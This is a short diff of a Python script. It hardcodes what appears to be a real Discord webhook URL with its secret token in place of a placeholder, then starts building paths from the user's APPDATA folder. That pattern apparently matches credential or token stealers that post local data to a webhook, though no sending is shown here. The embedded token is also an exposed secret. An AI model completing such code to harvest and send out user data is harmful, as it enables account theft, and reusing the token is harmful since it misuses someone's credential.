@@ -1,7 +1,7 @@
 import os, json
 from discord_webhook import DiscordWebhook
 
-webhook = DiscordWebhook(url='WEBHOOK URL')
+webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1534991753482993784/IkR_TazEiz3ESU0x_rK384qaS8zripokwqeC7Kl1r7vANxIkZEVSsOSYL6qqrMAsqKAV')
 
 # setup paths
 apd = os.getenv('APPDATA')
